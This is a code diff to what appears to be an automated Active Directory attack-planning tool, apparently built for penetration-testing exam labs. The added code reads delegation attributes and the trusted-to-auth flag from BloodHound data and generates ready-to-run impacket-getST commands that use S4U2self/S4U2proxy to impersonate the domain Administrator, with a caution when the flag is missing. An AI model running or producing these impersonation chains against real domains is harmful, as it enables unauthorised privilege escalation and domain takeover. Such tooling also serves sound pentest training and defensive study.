@@ -725,12 +725,19 @@ def run(report, store, ui=None):
     # for a target SPN. Use S4U2self+S4U2proxy to impersonate Administrator
     # to those services. Exam-legal (no relay, no admin gate).
     delegators = {}  # user_lc -> list of target SPNs
+    delegator_t2a = {}   # user_lc -> trusted-to-auth bool (T2A4D flag)
     for ev in store.items:
         if ev.kind != "ldap_attr":
             continue
         atd = (ev.meta or {}).get("allowed_to_delegate")
         if atd and ev.user:
             delegators[ev.user.lower()] = atd
+            # iter-92: capture the T2A4D flag when bloodhound.py surfaced
+            # it. Only true iff the delegator can S4U2Self for arbitrary
+            # users; false means constrained delegation is protocol-bound
+            # (S4U2Proxy needs an incoming ticket from the target user).
+            delegator_t2a[ev.user.lower()] = bool(
+                (ev.meta or {}).get("trusted_to_auth", False))
     if delegators:
         seen_c = set()
         for (ulc, pw), occurrences in e.creds.items():
@@ -803,12 +810,27 @@ def run(report, store, ui=None):
                     f"# {_spn_class}/... SPN - service-specific auth needed; "
                     f"use ticket against {_spn_host}",
                 ]
+            # iter-92: warn when T2A4D flag isn't set. Without it, S4U2Self
+            # only issues a ticket for the delegator itself - so the
+            # '-impersonate administrator' step will KDC_ERR_BADOPTION when
+            # the operator runs getST. BH-CE 5.x exposes this reliably;
+            # older SharpHound zips may leave it undefined (we default to
+            # True in that case so we don't fire the warning on stale data).
+            _t2a = delegator_t2a.get(ulc, True)
+            _t2a_note = "" if _t2a else (
+                "# CAUTION: 'trustedtoauth' flag NOT set on this delegator - "
+                "getST -impersonate administrator will fail (S4U2Self "
+                "constrained to the delegator itself). Try S4U2Self "
+                "impersonating THE DELEGATOR itself, or drop the "
+                "-impersonate flag entirely.")
             chains.append(Chain("R-CONSTRAINED", "constrained delegation",
                 f"{ulc} has AllowedToDelegateTo: {_spn_summary}",
                 crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
                 commands=[
                     f"# {ulc} is trusted to delegate to {len(spns)} "
-                    f"SPN{'s' if len(spns) != 1 else ''}",
+                    f"SPN{'s' if len(spns) != 1 else ''}"
+                    + (f" [T2A4D set - can impersonate arbitrary users]" if _t2a else ""),
+                    *([_t2a_note] if _t2a_note else []),
                     # iter-60: -dc-ip anchors KDC discovery on lab boxes
                     # without functional DNS resolution.
                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
